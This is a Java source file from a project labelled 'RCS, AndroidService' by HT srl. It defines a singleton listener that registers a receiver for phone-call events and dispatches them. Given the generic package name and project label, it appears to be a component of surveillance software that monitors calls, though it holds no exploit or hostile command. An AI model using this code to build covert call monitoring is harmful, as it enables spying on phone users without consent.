/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import com.android.service.Call;

public class ListenerCall extends Listener<Call> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerCall"; //$NON-NLS-1$

	private BroadcastMonitorCall callReceiver;

	/** The singleton. */
	private volatile static ListenerCall singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerCall self() {
		if (singleton == null) {
			synchronized (ListenerCall.class) {
				if (singleton == null) {
					singleton = new ListenerCall();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerCall();
	}

	@Override
	protected void stop() {

	}

	/**
	 * Register Power Connected/Disconnected.
	 */
	private void registerCall() {
		callReceiver = new BroadcastMonitorCall();
	}

	@Override
	public int dispatch(Call call) {
		return super.dispatch(call);
	}
}
